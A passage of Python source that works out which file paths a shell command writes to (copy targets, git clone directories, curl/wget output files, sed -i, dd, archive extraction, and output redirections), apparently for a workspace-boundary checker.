    """PRD §3.2 step 8: the paths this command names as destinations (critic finding 2)."""
    if not argv:
        return []
    head = argv[0]
    if signature == "sed -i":
        return _sed_files(list(argv))
    if head not in settings.write_shaped_commands:
        return []
    if head == "git":
        return _git_targets(signature, argv)
    rest = list(argv[1:])
    positionals = [token for token in rest if not token.startswith("-")]
    if head in ("tee", "touch", "mkdir"):
        return positionals
    if head in COPY_COMMANDS:
        return _copy_targets(head, rest)
    if head == "ln":
        return positionals[-1:] if len(positionals) >= 2 else positionals
    if head == "dd":
        return [token.split("=", 1)[1] for token in rest if token.startswith("of=")]
    if head == "curl":
        return _flag_values(rest, ("-o", "--output")) or _remote_names(rest)
    if head == "wget":
        return _flag_values(rest, ("-O", "--output-document"))
    if head in ("unzip", "tar"):
        return _flag_values(rest, ("-d", "-C", "--directory")) or ["."]
    return []


def _git_targets(signature: str, argv: tuple[str, ...]) -> list[str]:
    """The directory a ``git`` subcommand creates (:data:`GIT_DESTINATION_SHAPES`), or nothing.

    Every other git signature returns no target: git writes inside the repository it is already
    in, which the workspace boundary already covers — these four choose where the repository goes.
    """
    shape = GIT_DESTINATION_SHAPES.get(signature)
    if shape is None:
        return []
    value_flags, rule = shape
    rest = list(argv[1:])
    for word in signature.split()[1:]:  # step past `clone` / `worktree add` / `submodule add`
        if word in rest:
            rest = rest[rest.index(word) + 1:]
    positionals = _positionals(rest, value_flags)
    if rule == GIT_DESTINATION_FIRST:
        return positionals[:1]
    if rule == GIT_DESTINATION_FIRST_OR_CWD:
        return positionals[:1] or [CURRENT_DIRECTORY]
    if len(positionals) >= 2:
        return positionals[-1:]
    return [_repository_name(positionals[0])] if positionals else []


def _repository_name(source: str) -> str:
    """The directory ``git clone URL`` makes in the cwd: the URL's last component without ``.git``.

    ``https://host/org/tool.git`` → ``tool``, matching git's own default (git-clone(1)). A source
    that resolves to nothing (a bare host, a substitution) keeps the sentinel so the write is
    reported as unresolvable rather than silently dropped.
    """
    leaf = _leaf(source.split("?", 1)[0].split("#", 1)[0])
    if leaf.endswith(".git"):
        leaf = leaf[: -len(".git")]
    return leaf or SUBSTITUTION_SENTINEL


def _copy_targets(head: str, rest: list[str]) -> list[str]:
    """Destinations of ``cp``/``mv``/``install``/``rsync`` (PRD §3.2 step 8, finding R6).

    Normally the last positional, but ``-t DIR`` / ``--target-directory[=]DIR`` moves the
    destination into a flag and makes every positional a source — so the targets are the sources'
    names inside DIR (``cp -t ~/.ssh mykey`` writes ``~/.ssh/mykey``). See
    :data:`TARGET_DIRECTORY_COMMANDS` for why ``rsync`` keeps the positional rule.
    """
    if head in TARGET_DIRECTORY_COMMANDS:
        sources = _positionals(rest, COPY_VALUE_FLAGS)
        directory = _flag_values(rest, TARGET_DIRECTORY_FLAGS)
        if directory and not any(token in NO_TARGET_DIRECTORY_FLAGS for token in rest):
            return [posixpath.join(directory[-1], _leaf(source)) for source in sources] or [
                directory[-1]
            ]
        return sources[-1:] if len(sources) >= 2 else sources
    positionals = [token for token in rest if not token.startswith("-")]
    return positionals[-1:] if len(positionals) >= 2 else positionals


def _positionals(rest: list[str], value_flags: frozenset[str]) -> list[str]:
    """Arguments that are paths: options dropped, and the value of a value-taking option too."""
    out: list[str] = []
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-") and token != "-":
            index += 2 if token in value_flags else 1
            continue
        out.append(token)
        index += 1
    return out


def _leaf(path: str) -> str:
    """The name a copy keeps when it lands in a directory (``src/key`` → ``key``)."""
    return posixpath.basename(path.rstrip("/")) or path


def _flag_values(rest: list[str], flags: tuple[str, ...]) -> list[str]:
    """Values of ``flag VALUE`` / ``flag=VALUE`` occurrences."""
    values: list[str] = []
    for index, token in enumerate(rest):
        if token in flags and index + 1 < len(rest):
            values.append(rest[index + 1])
        elif any(token.startswith(f"{flag}=") for flag in flags):
            values.append(token.split("=", 1)[1])
    return values


def _remote_names(rest: list[str]) -> list[str]:
    """``curl -O URL`` writes the URL's basename into the cwd (PRD §3.2 step 8)."""
    if not any(token == "-O" or (token.startswith("-") and not token.startswith("--") and "O" in token)
               for token in rest):
        return []
    urls = [token for token in rest if not token.startswith("-")]
    if not urls:
        return [SUBSTITUTION_SENTINEL]
    return [urls[-1].split("?", 1)[0].rstrip("/").rsplit("/", 1)[-1] or SUBSTITUTION_SENTINEL]


def _sed_files(argv: list[str]) -> list[str]:
    """``sed -i`` rewrites its file arguments in place; the script is not a file."""
    rest = argv[1:]
    has_script_flag = any(
        token in SED_SCRIPT_FLAGS or token.split("=", 1)[0] in SED_SCRIPT_FLAGS for token in rest
    )
    positionals: list[str] = []
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-"):
            index += 2 if token in SED_SCRIPT_FLAGS else 1
            continue
        positionals.append(token)
        index += 1
    if has_script_flag:
        return positionals
    return positionals[1:]


# --------------------------------------------------------------------------- tokenizing

def _extract_redirections(text: str) -> tuple[str, list[str]]:
    """Pull ``>``/``>>`` targets out of one command, returning the rest (PRD §3.2 step 8).

    Input redirections (``<``, ``<<<``) and fd duplications (``2>&1``) are removed without a
    target. ``shlex`` cannot do this: it has no operator grammar.
    """
    out: list[str] = []
    targets: list[str] = []
    index = 0
    quote: str | None = None
    while index < len(text):
        char = text[index]
        if quote:
            out.append(char)
            if char == "\\" and quote == '"' and index + 1 < len(text):
                out.append(text[index + 1])
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(text):
            out.append(text[index : index + 2])
            index += 2
            continue
        if char in "'\"`":
            quote = char
            out.append(char)
            index += 1
            continue
        if char in "<>" or (char == "&" and text[index + 1 : index + 2] == ">"):
            operator = ""
            if char == "&":
                operator = "&"
                index += 1
                char = text[index]
            else:
                # A leading fd number is part of the operator (`2>log`), not of the word
                # before it; `&>log` reaches us with the `&` already buffered.
                while out and out[-1].isdigit():
                    out.pop()
                if out and out[-1] == "&":
                    out.pop()
                    operator = "&"
            operator += char
            index += 1
            duplicates_fd = False
            while index < len(text) and text[index] in REDIRECTION_OPERATOR_CHARS:
                duplicates_fd = duplicates_fd or text[index] == "&"
                operator += text[index]
                index += 1
            while index < len(text) and text[index] in " \t":
                index += 1
            word, index = _read_word(text, index)
            # `N>&M`, `>&M`, `<&M`, `N>&-` move a file descriptor — no file is named, and the
            # operand (`1`, `-`) is not a command. `&>FILE` and `N>FILE` do name a file.
            if ">" in operator and not duplicates_fd and word and not word.startswith("&"):
                targets.append(_unquote(word))
            out.append(" ")
            continue
        out.append(char)
        index += 1
    return "".join(out), targets


def _read_word(text: str, index: int) -> tuple[str, int]:
    """Read one whitespace-delimited word from ``index``, honouring quotes."""
    out: list[str] = []
    quote: str | None = None
    while index < len(text):
        char = text[index]
        if quote:
            out.append(char)
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(text):
            out.append(text[index : index + 2])
            index += 2
            continue
        if char in "'\"":
            quote = char
            out.append(char)
            index += 1
            continue
        if char in " \t\n":
            break
        out.append(char)
        index += 1
    return "".join(out), index


def _unquote(word: str) -> str:
    """Drop one level of shell quoting from a single word."""
    try:
        parts = shlex.split(word)
    except ValueError:
        return word.strip("'\"")
    return parts[0] if parts else word


def _tokenize(text: str) -> list[str]:
    """``shlex`` one command (comments stripped); fall back to whitespace on bad quoting."""
    try:
        return shlex.split(text, comments=True)
    except ValueError:
        return text.split()
